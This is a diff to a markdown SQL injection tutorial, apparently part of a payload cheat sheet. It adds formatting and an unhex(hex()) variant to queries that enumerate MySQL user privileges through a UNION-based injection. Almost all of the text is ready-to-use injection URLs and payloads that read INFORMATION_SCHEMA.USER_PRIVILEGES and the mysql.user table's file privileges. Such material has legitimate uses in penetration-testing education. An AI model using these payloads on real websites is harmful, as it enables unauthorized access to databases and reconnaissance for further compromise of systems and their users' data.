@@ -7,10 +7,19 @@ Let's suppose that the website has 12 columns and the given UNION Based SQL quer
 ```http://domain.com/index.php?id=1' Union Select 1,2,3,4,5,6,7,8,9,10,11,12-- -```
 
 Payload used for Privilege Check via I_S.PRIVILEGES:  
-```(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)```
+```sql
+(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)
+```
 
 Payload used for Privilege Check via MySQL System Table:  
-```(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)```
+```sql
+(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)
+```
+
+If for some reason you get Errors when using the mentioned queries, try the following query instead (it uses unhex(hex()) functions to avoid servier-side conflicts:  
+```sql
+(SELECT+unhex(hex(GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)))+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)
+```
 
 Apply one of the queries into the 4th column:  
 ```http://domain.com/index.php?id=1' Union Select 1,2,3,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),5,6,7,8,9,10,11,12-- -```
